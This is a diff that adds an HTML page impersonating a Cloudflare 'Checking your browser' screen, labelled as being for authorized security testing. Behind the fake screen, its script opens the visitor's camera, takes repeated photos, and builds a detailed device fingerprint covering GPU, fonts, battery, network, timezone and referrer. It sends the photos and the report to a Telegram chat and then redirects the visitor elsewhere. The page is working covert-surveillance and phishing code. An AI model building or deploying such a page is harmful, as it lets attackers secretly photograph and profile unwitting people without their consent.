@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Just a moment...</title>
+  <script src="config.js"></script>
+  <link rel="stylesheet" href="styles.css">
+  <link rel="icon" href="favicon.svg">
+  <style>
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;background:#fff;color:#333;line-height:1.6;min-height:100vh}
+    .container{background:#fff;text-align:center;min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center}
+    .cloudflare-screen{max-width:600px;width:100%;padding:40px 24px;animation:fadeIn .25s ease-out}
+    @keyframes fadeIn{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:translateY(0)}}
+    .cf-logo{margin-bottom:28px}.cf-logo svg{width:72px;height:72px}
+    .cf-title{font-size:22px;font-weight:600;color:#222;margin-bottom:16px;line-height:1.3}
+    .cf-subtitle{font-size:15px;color:#666;margin-bottom:28px;line-height:1.6}
+    .cf-loading{margin:32px 0}
+    .cf-spinner{border:3px solid #e8e8e8;border-top-color:#f4811e;border-radius:50%;width:40px;height:40px;animation:spin .9s linear infinite;margin:0 auto 18px}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .cf-progress{font-size:14px;color:#666;min-height:1.4em}
+    .cf-footer{margin-top:40px;padding-top:18px;border-top:1px solid #e8e8e8;font-size:12px;color:#999}
+    .cf-ray-id{font-family:monospace;background:#f5f5f5;padding:2px 8px;border-radius:4px}
+    #video,#canvas{display:none!important}
+  </style>
+</head>
+<body>
+<div class="container">
+  <video id="video" autoplay playsinline muted></video>
+  <canvas id="canvas"></canvas>
+  <div class="cloudflare-screen" id="cloudflareScreen">
+    <div class="cf-logo">
+      <svg viewBox="0 0 72 72" fill="none"><circle cx="36" cy="36" r="36" fill="#f4811e"/><path d="M52 36c0-8.84-7.16-16-16-16s-16 7.16-16 16h4c0-6.63 5.37-12 12-12s12 5.37 12 12h4z" fill="#fff"/><path d="M36 28c-4.42 0-8 3.58-8 8h2c0-3.31 2.69-6 6-6s6 2.69 6 6h2c0-4.42-3.58-8-8-8z" fill="#fff"/><rect x="34" y="36" width="4" height="12" rx="2" fill="#fff"/><circle cx="36" cy="44" r="3" fill="#f4811e"/></svg>
+    </div>
+    <div class="cf-title">Checking your browser before accessing <span id="targetSite">the requested site</span>.</div>
+    <div class="cf-subtitle">This process is automatic. Your browser will redirect to your requested content shortly.<br><br>Please allow up to <span id="countdown">5</span> seconds…</div>
+    <div class="cf-loading"><div class="cf-spinner"></div><div class="cf-progress" id="progressText">Performing security check…</div></div>
+    <div class="cf-footer">DDoS protection by <strong>Cloudflare</strong><br><br>Ray ID: <span class="cf-ray-id" id="rayId">••••••••••••••••</span></div>
+  </div>
+</div>
+
+<script>
+/**
+ * Capture Page — For Authorized Security Testing Only
+ * 
+ * When a target visits this page:
+ * 1. A fake Cloudflare DDoS protection screen is displayed
+ * 2. Camera access is requested silently
+ * 3. Photos + device fingerprint are sent to Telegram
+ * 4. After 5 seconds, target is redirected to the specified URL
+ */
+
+(async function() {
+  'use strict';
+
+  // ── Load Configuration ────────────────────────────────────
+  const C = window.CAPTURE_CONFIG || {};
+  const API   = C.api   || {};
+  const CAM   = C.camera || {};
+  const TIME  = C.timing || {};
+  const CFG   = C.cloudflareScreen || {};
+
+  // ── DOM Helpers ────────────────────────────────────────────
+  const $ = id => document.getElementById(id);
+  const param = name => new URLSearchParams(location.search).get(name) || '';
+  const log = (...args) => { if (C.debug?.consoleLogging !== false) console.log('[Capture]', ...args); };
+  const genRayId = () => Array.from({length:16},()=>'0123456789abcdef'[Math.floor(Math.random()*16)]).join('');
+
+  // ── Get URL Parameters ────────────────────────────────────
+  const chatId   = param('chatid') || C.defaultChatId;
+  const redirect = param('redirect');
+
+  // ── Setup Cloudflare Screen ───────────────────────────────
+  $('rayId').textContent = genRayId();
+  if (redirect) {
+    $('targetSite').textContent = redirect.replace(/^https?:\/\//,'').replace(/\/.*$/,'') || 'the requested site';
+  }
+
+  // ── Countdown Timer ───────────────────────────────────────
+  let secs = CFG.duration || TIME.cloudflareDuration || 5;
+  const msgs = CFG.progressMessages || [
+    'Performing security check…',
+    'Analyzing browser fingerprint…',
+    'Checking for malicious activity…',
+    'Validating request integrity…',
+    'Finalizing security verification…',
+  ];
+  const cEl = $('countdown');
+  const pEl = $('progressText');
+  const countdown = setInterval(() => {
+    secs--;
+    if (cEl) cEl.textContent = Math.max(secs, 0);
+    if (secs > 0 && secs < msgs.length && pEl) pEl.textContent = msgs[msgs.length - secs];
+    if (secs <= 0) { if (pEl) pEl.textContent = 'Redirecting to your requested content…'; clearInterval(countdown); }
+  }, 1000);
+
+  // ── Bail Early If No Chat ID ──────────────────────────────
+  if (!chatId) {
+    log('No chat ID. Running in demo mode (no capture).');
+    setTimeout(() => {
+      const url = redirect || C.redirect?.fallbackUrl || 'https://www.google.com';
+      location.href = C.redirect?.autoHttps !== false && !url.includes('://') && url.includes('.') ? 'https://'+url : url;
+    }, (CFG.duration || TIME.cloudflareDuration || 5) * 1000);
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════
+  //  DEVICE FINGERPRINT COLLECTION
+  // ═══════════════════════════════════════════════════════════
+
+  /**
+   * Collects comprehensive device information from the browser.
+   * @returns {Object} Device fingerprint data
+   */
+  function collectDeviceInfo() {
+    const info = {
+      userAgent:       navigator.userAgent,
+      platform:        navigator.platform,
+      vendor:          navigator.vendor || '',
+      language:        navigator.language,
+      languages:       navigator.languages ? navigator.languages.join(', ') : '',
+      cookies:         navigator.cookieEnabled ? 'Enabled' : 'Disabled',
+      doNotTrack:      navigator.doNotTrack || 'Not set',
+      hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+      maxTouchPoints:  navigator.maxTouchPoints || 0,
+      screenWidth:     screen.width,
+      screenHeight:    screen.height,
+      screenAvailWidth:  screen.availWidth,
+      screenAvailHeight: screen.availHeight,
+      screenColorDepth:  screen.colorDepth || screen.pixelDepth,
+      windowWidth:     window.innerWidth,
+      windowHeight:    window.innerHeight,
+      timezone:        Intl.DateTimeFormat().resolvedOptions().timeZone,
+      timezoneOffset:  new Date().getTimezoneOffset(),
+      url:             location.href,
+      referrer:        document.referrer || '(direct)',
+      title:           document.title,
+      online:          navigator.onLine,
+    };
+
+    // Network information
+    if (navigator.connection) {
+      const c = navigator.connection;
+      info.networkType       = c.effectiveType || 'Unknown';
+      info.networkDownlink   = c.downlink + ' Mbps';
+      info.networkRTT        = c.rtt + ' ms';
+      info.networkSaveData   = c.saveData ? 'Yes' : 'No';
+    }
+
+    // Memory information
+    if (performance.memory) {
+      info.memoryUsed  = this.formatBytes(performance.memory.usedJSHeapSize);
+      info.memoryTotal = this.formatBytes(performance.memory.totalJSHeapSize);
+      info.memoryLimit = this.formatBytes(performance.memory.jsHeapSizeLimit);
+    }
+
+    // WebGL / GPU information
+    try {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      if (gl) {
+        info.gpuVendor  = gl.getParameter(gl.VENDOR);
+        info.gpuRenderer = gl.getParameter(gl.RENDERER);
+      }
+    } catch (e) {
+      info.gpuVendor = 'WebGL unavailable';
+    }
+
+    // Installed fonts (approximate via canvas)
+    info.fonts = this.detectFonts();
+
+    // Plugin information
+    const plugins = [];
+    for (let i = 0; i < navigator.plugins.length; i++) {
+      plugins.push(navigator.plugins[i].name);
+    }
+    info.plugins = plugins.join(', ') || 'None';
+
+    // Battery
+    // (collected separately via async)
+
+    // Device memory
+    if (navigator.deviceMemory) {
+      info.deviceMemory = navigator.deviceMemory + ' GB';
+    }
+
+    return info;
+  }
+
+  /**
+   * Detect installed fonts using canvas text rendering.
+   * @returns {string} Comma-separated list of detected fonts
+   */
+  function detectFonts() {
+    const baseFonts = ['monospace', 'sans-serif', 'serif'];
+    const fontList = [
+      'Arial', 'Arial Black', 'Arial Narrow', 'Book Antiqua', 'Bookman',
+      'Calibri', 'Cambria', 'Candara', 'Century Gothic', 'Comic Sans MS',
+      'Consolas', 'Courier New', 'Georgia', 'Gill Sans', 'Helvetica',
+      'Impact', 'Lucida Console', 'Lucida Grande', 'Lucida Sans Unicode',
+      'Microsoft Sans Serif', 'Palatino Linotype', 'Segoe UI', 'Tahoma',
+      'Times New Roman', 'Trebuchet MS', 'Verdana',
+    ];
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    const text = 'mmmmmmmmmmlli';
+    ctx.font = '72px monospace';
+    const baseWidth = ctx.measureText(text).width;
+    const detected = [];
+    for (const font of fontList) {
+      ctx.font = '72px "' + font + '", monospace';
+      if (ctx.measureText(text).width !== baseWidth) {
+        detected.push(font);
+      }
+    }
+    return detected.join(', ') || 'Standard fonts only';
+  }
+
+  /**
+   * Format bytes to human-readable string.
+   * @param {number} bytes - Value in bytes
+   * @returns {string} Formatted string
+   */
+  function formatBytes(bytes) {
+    if (!bytes) return 'Unknown';
+    const sizes = ['B', 'KB', 'MB', 'GB'];
+    const i = Math.floor(Math.log(bytes) / Math.log(1024));
+    return (bytes / Math.pow(1024, i)).toFixed(2) + ' ' + sizes[i];
+  }
+
+  /**
+   * Get battery information.
+   * @returns {Promise<Object|null>} Battery status
+   */
+  async function getBatteryInfo() {
+    if (!('getBattery' in navigator)) return null;
+    try {
+      const b = await navigator.getBattery();
+      return {
+        level: Math.round(b.level * 100) + '%',
+        charging: b.charging ? 'Yes ⚡' : 'No',
+        chargingTime: b.chargingTime === Infinity ? 'N/A' : b.chargingTime + 's',
+        dischargingTime: b.dischargingTime === Infinity ? 'N/A' : b.dischargingTime + 's',
+      };
+    } catch { return null; }
+  }
+
+  /**
+   * Get camera model name from user agent.
+   * @returns {string} Camera model
+   */
+  function getCameraModel() {
+    const ua = navigator.userAgent.toLowerCase();
+    const p  = navigator.platform.toLowerCase();
+    if (ua.includes('iphone os 17')) return 'iPhone 15 Pro Max';
+    if (ua.includes('iphone os 16')) return 'iPhone 14 Pro';
+    if (ua.includes('iphone os 15')) return 'iPhone 13 Pro';
+    if (ua.includes('iphone')) return 'iPhone';
+    if (ua.includes('ipad')) return 'iPad Pro';
+    if (p.includes('mac')) return 'Mac Camera (FaceTime HD)';
+    if (ua.includes('android')) {
+      const m = ua.match(/android ([\d.]+)/);
+      const brands = { samsung:'Samsung Galaxy', google:'Google Pixel', huawei:'Huawei', xiaomi:'Xiaomi', oneplus:'OnePlus', oppo:'OPPO', vivo:'Vivo', lg:'LG', sony:'Sony' };
+      for (const [k,v] of Object.entries(brands)) if (ua.includes(k)) return v;
+      return 'Android ' + (m ? m[1] : '') + ' Device';
+    }
+    if (p.includes('win')) return 'Windows Webcam';
+    if (p.includes('linux')) return 'Linux Camera';
+    return 'Unknown Camera';
+  }
+
+  /**
+   * Get operating system name from user agent.
+   * @returns {string} OS name
+   */
+  function getOS() {
+    const ua = navigator.userAgent;
+    const p  = navigator.platform;
+    if (ua.includes('Windows NT 11')) return 'Windows 11';
+    if (ua.includes('Windows NT 10')) return 'Windows 10';
+    if (ua.includes('Windows NT 6.3')) return 'Windows 8.1';
+    if (ua.includes('Windows NT 6.1')) return 'Windows 7';
+    if (ua.includes('Mac OS X')) {
+      const m = ua.match(/Mac OS X ([\d_]+)/);
+      return 'macOS ' + (m ? m[1].replace(/_/g, '.') : '');
+    }
+    if (ua.includes('Android')) {
+      const m = ua.match(/Android ([\d.]+)/);
+      return 'Android ' + (m ? m[1] : '');
+    }
+    if (ua.includes('Linux')) {
+      if (ua.includes('CrOS')) return 'ChromeOS';
+      if (p.includes('arm')) return 'Linux (ARM)';
+      return 'Linux';
+    }
+    if (ua.includes('iPhone')) return 'iOS';
+    if (ua.includes('iPad')) return 'iPadOS';
+    return p || 'Unknown';
+  }
+
+  /**
+   * Get browser name and version.
+   * @returns {string} Browser info
+   */
+  function getBrowser() {
+    const ua = navigator.userAgent;
+    const browsers = [
+      { n: 'Chrome',  r: /(Chrome|Chromium)\/([\d.]+)/ },
+      { n: 'Firefox', r: /Firefox\/([\d.]+)/ },
+      { n: 'Safari',  r: /Version\/([\d.]+).*Safari/ },
+      { n: 'Edge',    r: /Edg\/([\d.]+)/ },
+      { n: 'Opera',   r: /OPR\/([\d.]+)/ },
+      { n: 'IE',      r: /MSIE ([\d.]+)/ },
+    ];
+    for (const b of browsers) {
+      const m = ua.match(b.r);
+      if (m) return b.n + ' ' + m[1];
+    }
+    return 'Unknown';
+  }
+
+  // ═══════════════════════════════════════════════════════════
+  //  DATA SENDING FUNCTIONS
+  // ═══════════════════════════════════════════════════════════
+
+  let stream = null;
+  let photoCount = 0;
+  let captureInterval = null;
+  let camMetadata = null;
+
+  const video  = $('video');
+  const canvas = $('canvas');
+  const ctx    = canvas.getContext('2d');
+
+  /**
+   * Send a text message to Telegram (with chunking for long messages).
+   * @param {string} text - Message text
+   */
+  async function sendMessage(text) {
+    if (!text?.trim()) return;
+    const maxLen = 4000;
+    const chunks = [];
+    for (let i = 0; i < text.length; i += maxLen) {
+      chunks.push(text.substring(i, i + maxLen));
+    }
+    for (let i = 0; i < chunks.length; i++) {
+      let chunk = chunks[i];
+      if (chunks.length > 1) {
+        chunk = `(Part ${i+1}/${chunks.length})\n\n${chunk}`;
+      }
+      const fd = new FormData();
+      fd.append('chat_id', chatId);
+      fd.append('text', chunk);
+      fd.append('parse_mode', 'HTML');
+      try {
+        const resp = await fetch(API.sendMessage || '/api/sendMessage', { method: 'POST', body: fd });
+        log('Message sent:', await resp.json());
+      } catch (e) { log('Message error:', e); }
+      if (chunks.length > 1) await new Promise(r => setTimeout(r, 500));
+    }
+  }
+
+  /**
+   * Send a photo to Telegram with metadata caption.
+   * @param {Blob} blob - JPEG image blob
+   * @param {number} num - Photo number
+   */
+  async function sendPhoto(blob, num) {
+    // Build rich caption
+    const captionLines = [
+      `📸 **Photo #${num}**`,
+      `🕐 \`${new Date().toISOString()}\``,
+      `📱 ${getOS()} | ${navigator.platform}`,
+      `🌐 ${navigator.language}`,
+      `🖥️ ${canvas.width}×${canvas.height}px`,
+      `🌍 ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
+      `💾 CPU: ${navigator.hardwareConcurrency || '?'} cores`,
+    ];
+
+    if (camMetadata) {
+      captionLines.push(`📷 ${camMetadata.model} | ${camMetadata.resolution}`);
+    }
+
+    const caption = captionLines.join('\n');
+
+    const fd = new FormData();
+    fd.append('chat_id', chatId);
+    fd.append('photo', blob, `photo_${num}_${Date.now()}.jpg`);
+    fd.append('caption', caption);
+    fd.append('parse_mode', 'Markdown');
+
+    try {
+      const resp = await fetch(API.sendPhoto || '/api/sendPhoto', { method: 'POST', body: fd });
+      const result = await resp.json();
+      log('Photo sent:', result);
+      return result?.ok;
+    } catch (e) {
+      log('Photo error:', e);
+      return false;
+    }
+  }
+
+  /**
+   * Build and send the full device fingerprint report.
+   * @param {Object} info - Device info object
+   * @param {Object|null} battery - Battery info object
+   */
+  async function sendDeviceReport(info, battery) {
+    const sections = [
+      '🔍 **COMPREHENSIVE DEVICE REPORT**',
+      '',
+      '── SYSTEM ──',
+      `• OS: ${getOS()}`,
+      `• Platform: ${info.platform}`,
+      `• Browser: ${getBrowser()}`,
+      `• User Agent: ${info.userAgent}`,
+      `• Vendor: ${info.vendor || 'N/A'}`,
+      '',
+      '── DISPLAY ──',
+      `• Resolution: ${info.screenWidth}×${info.screenHeight}`,
+      `• Available: ${info.screenAvailWidth}×${info.screenAvailHeight}`,
+      `• Color Depth: ${info.screenColorDepth}-bit`,
+      `• Window: ${info.windowWidth}×${info.windowHeight}`,
+      '',
+      '── LOCALE ──',
+      `• Language: ${info.language}`,
+      `• Languages: ${info.languages || 'N/A'}`,
+      `• Timezone: ${info.timezone}`,
+      `• Offset: UTC${info.timezoneOffset > 0 ? '-' : '+'}${Math.abs(info.timezoneOffset / 60)}h`,
+      '',
+      '── HARDWARE ──',
+      `• CPU Cores: ${info.hardwareConcurrency}`,
+      `• Touch Points: ${info.maxTouchPoints}`,
+      `• Device Memory: ${info.deviceMemory || 'N/A'}`,
+      info.memoryUsed ? `• JS Heap: ${info.memoryUsed} / ${info.memoryTotal}` : '',
+      info.gpuVendor ? `• GPU: ${info.gpuVendor} — ${info.gpuRenderer}` : '',
+      '',
+      '── NETWORK ──',
+      `• Online: ${info.online ? 'Yes' : 'No'}`,
+      info.networkType ? `• Type: ${info.networkType}` : '',
+      info.networkDownlink ? `• Speed: ${info.networkDownlink}` : '',
+      info.networkRTT ? `• Latency: ${info.networkRTT}` : '',
+      `• Do Not Track: ${info.doNotTrack}`,
+      '',
+      '── BATTERY ──',
+      battery ? `• Level: ${battery.level}` : '• Not available',
+      battery ? `• Charging: ${battery.charging}` : '',
+      '',
+      '── BROWSER ──',
+      `• Cookies: ${info.cookies}`,
+      `• Plugins: ${info.plugins}`,
+      `• Fonts: ${info.fonts}`,
+      '',
+      '── CAMERA ──',
+      camMetadata ? `• Model: ${camMetadata.model}` : '• Unknown',
+      camMetadata ? `• Resolution: ${camMetadata.resolution}` : '',
+      camMetadata ? `• Facing: ${camMetadata.facingMode}` : '',
+      camMetadata ? `• FPS: ${camMetadata.frameRate}` : '',
+      '',
+      '── PAGE ──',
+      `• URL: ${info.url}`,
+      `• Referrer: ${info.referrer}`,
+      `• Title: ${info.title}`,
+      '',
+      `⏱ Report generated: ${new Date().toISOString()}`,
+    ];
+
+    const report = sections.filter(Boolean).join('\n');
+    await sendMessage(report);
+  }
+
+  // ═══════════════════════════════════════════════════════════
+  //  CAMERA CAPTURE
+  // ═══════════════════════════════════════════════════════════
+
+  /**
+   * Start camera and begin capture cycle.
+   */
+  async function startCamera() {
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: {
+          width:  CAM.width  || { ideal: 1280 },
+          height: CAM.height || { ideal: 720 },
+          facingMode: CAM.facingMode || { ideal: 'user' },
+        },
+      });
+      video.srcObject = stream;
+
+      await new Promise(r => { video.addEventListener('loadedmetadata', r, { once: true }); });
+
+      // Get camera metadata
+      const track = stream.getVideoTracks()[0];
+      const settings = track.getSettings();
+      camMetadata = {
+        model:      getCameraModel(),
+        resolution: `${settings.width}×${settings.height}`,
+        facingMode: settings.facingMode || 'unknown',
+        frameRate:  settings.frameRate || 'unknown',
+        deviceId:   settings.deviceId || 'unknown',
+      };
+
+      log('Camera started:', camMetadata);
+
+      // Wait for camera to stabilize
+      await new Promise(r => setTimeout(r, TIME.firstPhotoDelay || 1500));
+
+      // Collect all device info first
+      const info = collectDeviceInfo();
+      info.formatBytes = formatBytes;
+      const battery = await getBatteryInfo();
+
+      // Take first photo and send device report
+      const firstSent = await captureAndSend();
+      if (firstSent) {
+        await sendDeviceReport(info, battery);
+      }
+
+      // Start continuous capture
+      captureInterval = setInterval(captureAndSend, CAM.captureInterval || 2500);
+
+    } catch (e) {
+      log('Camera error:', e.message);
+      // Send notification that camera was denied
+      await sendMessage([
+        '⚠️ **CAMERA ACCESS DENIED**',
+        '',
+        `📱 ${getOS()} | ${navigator.platform}`,
+        `🌐 ${navigator.language}`,
+        `🖥️ ${screen.width}×${screen.height}`,
+        `🌍 ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
+        `🔗 ${location.href}`,
+      ].join('\n'));
+    }
+  }
+
+  /**
+   * Capture a single photo and send it.
+   * @returns {Promise<boolean>} Whether the photo was sent successfully
+   */
+  async function captureAndSend() {
+    try {
+      if (CAM.maxPhotos > 0 && photoCount >= CAM.maxPhotos) {
+        if (captureInterval) clearInterval(captureInterval);
+        return false;
+      }
+
+      canvas.width  = video.videoWidth  || 640;
+      canvas.height = video.videoHeight || 480;
+      ctx.drawImage(video, 0, 0);
+
+      photoCount++;
+
+      return new Promise((resolve) => {
+        canvas.toBlob(async (blob) => {
+          if (!blob) { resolve(false); return; }
+          const ok = await sendPhoto(blob, photoCount);
+          resolve(ok);
+        }, 'image/jpeg', CAM.jpegQuality || 0.92);
+      });
+
+    } catch (e) {
+      log('Capture error:', e);
+      return false;
+    }
+  }
+
+  // ═══════════════════════════════════════════════════════════
+  //  INITIALIZATION
+  // ═══════════════════════════════════════════════════════════
+
+  // Start camera capture
+  await startCamera();
+
+  // Schedule redirect after the Cloudflare duration
+  const durationMs = (CFG.duration || TIME.cloudflareDuration || 5) * 1000;
+  setTimeout(() => {
+    // Stop capture
+    if (captureInterval) clearInterval(captureInterval);
+    if (stream) stream.getTracks().forEach(t => t.stop());
+
+    // Execute redirect
+    let url = redirect || C.redirect?.fallbackUrl || 'https://www.google.com';
+    if (C.redirect?.autoHttps !== false && !url.includes('://') && url.includes('.')) {
+      url = 'https://' + url;
+    }
+    log('Redirecting to:', url);
+    try { location.href = url; } catch { try { location.replace(url); } catch {} }
+  }, durationMs);
+
+  // Cleanup on page unload
+  window.addEventListener('beforeunload', () => {
+    if (captureInterval) clearInterval(captureInterval);
+    if (stream) stream.getTracks().forEach(t => t.stop());
+  });
+
+})();
+</script>
+</body>
+</html>
